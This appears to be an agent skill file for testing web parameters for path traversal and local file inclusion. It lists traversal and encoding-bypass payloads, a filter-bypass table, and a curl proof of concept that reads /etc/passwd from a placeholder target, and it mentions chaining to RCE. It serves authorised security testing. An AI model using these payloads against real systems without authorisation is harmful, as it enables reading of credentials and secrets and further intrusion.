---
name: path-traversal
description: Tests web parameters for path traversal / directory traversal (LFI) to read arbitrary files on the server. Use when a parameter looks like a filename or path (file=, path=, doc=, document=, template=, page=, image=, download), when download/preview endpoints or template/image loaders take a name, when ../ sequences seem to influence a path, or when probing for /etc/passwd, win.ini, source/config/credential disclosure, or local file inclusion.
---

# Path Traversal (Directory Traversal / LFI)

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


Read arbitrary files on the server by escaping the intended directory with `../` (or platform/encoding variants). Proven impact = reading a file you should NOT be able to read.

## When to test
Any parameter whose value is, or feeds into, a filesystem path:
- Obvious names: `file=`, `filename=`, `path=`, `doc=`, `document=`, `template=`, `page=`, `view=`, `image=`, `img=`, `download=`, `attachment=`, `dir=`, `folder=`.
- Endpoints: download/preview/export handlers, image/avatar loaders, template/theme/locale loaders, log viewers, PDF/report generators.
- Signals: the value already contains a path or extension (`logo.png`, `en_US.json`, `reports/2024.pdf`); changing it changes which file is served.

## Impact & priority
- **High** when it reads sensitive data: `/etc/passwd`, app source, config files with DB creds/secrets, `.env`, private keys, cloud metadata-adjacent files.
- **Critical** when chainable: read source -> find more bugs; read secrets -> auth bypass; **LFI -> RCE** via log poisoning, PHP wrappers, session files, or writable includes.
- **Low / not worth reporting** when it only reads files the user is already entitled to, or non-sensitive trivia.

## Detection
1. Baseline the normal response for the legitimate value.
2. Probe with a traversal sequence: `?file=../../../../etc/passwd` (try several depths, 1-10 `../`).
3. **Confirm** with a known OS file whose content is unmistakable:
   - Linux: `/etc/passwd` -> lines like `root:x:0:0:root:/root:/bin/bash`.
   - Windows: `/windows/win.ini` -> `[fonts]` / `[extensions]` section headers.
4. If the raw probe fails, the input is likely filtered or constrained — move to Exploitation.

## Exploitation
Work through these when a naive `../` is blocked:
- **Absolute path** — defenses that only strip traversal may still accept `file=/etc/passwd`.
- **Nested sequences** — if `../` is stripped non-recursively, use `....//` or `....\/` so the leftover collapses to `../`.
- **Encoding** — URL `%2e%2e%2f`, double `%252e%252e%252f`, non-standard `..%c0%af` / `..%ef%bc%8f`. Try mixing.
- **Required base folder** — if input must start with the expected dir, prepend it: `file=/var/www/images/../../../etc/passwd`.
- **Required extension + null byte** — if a `.png`/`.pdf` suffix is enforced (legacy stacks): `file=../../../etc/passwd%00.png`.
- Combine bypasses (e.g. base folder + double encoding) when single techniques fail.

## Common bypasses
| Defense | Bypass |
|---|---|
| Strips `../` once | Nested `....//`, `....\/` |
| Blocks literal `../` | URL-encode `%2e%2e%2f`; double `%252e%252e%252f` |
| Decodes once, then filters | Double / non-standard encoding `..%c0%af`, `..%ef%bc%8f` |
| Path must start with base dir | `/<base>/../../../etc/passwd` |
| Appends/requires extension | Null byte `%00` (older platforms) |
| Blocks absolute path | Traversal from within base dir |

Full payload matrix in **cheatsheet.md**; technique detail in **reference.md**.

## Minimal PoC
Read one sensitive file, nothing more. Log proven hits to `./_EXPLOIT/`.
```bash
# Proven LFI: arbitrary read of /etc/passwd
curl -s 'https://TARGET/loadImage?filename=../../../../etc/passwd'
# Expected: root:x:0:0:root:/root:/bin/bash
```
Save a minimal repro:
```bash
mkdir -p ./_EXPLOIT
cat > ./_EXPLOIT/path-traversal_TARGET.md <<'EOF'
# Path Traversal — TARGET /loadImage?filename=
curl -s 'https://TARGET/loadImage?filename=../../../../etc/passwd'
# -> root:x:0:0:root:/root:/bin/bash  (arbitrary file read)
EOF
```

## Don't report as noise
- Reading a file the feature is designed to serve to you (your own avatar, a public asset) — not a vuln.
- Files only your own account/process can read, or empty/uninteresting content — not impact.
- A reflected `../` that is sanitized/canonicalized and resolves back inside the base dir.
- To report: show ONE unmistakably out-of-scope sensitive file (e.g. `/etc/passwd` or a config holding secrets). Do not bulk-dump the filesystem — one proof file is enough.

## Deep reference
See **reference.md** (techniques, obstacles, prevention) and **cheatsheet.md** (copy-paste payloads + target files).
Source: https://portswigger.net/web-security/file-path-traversal
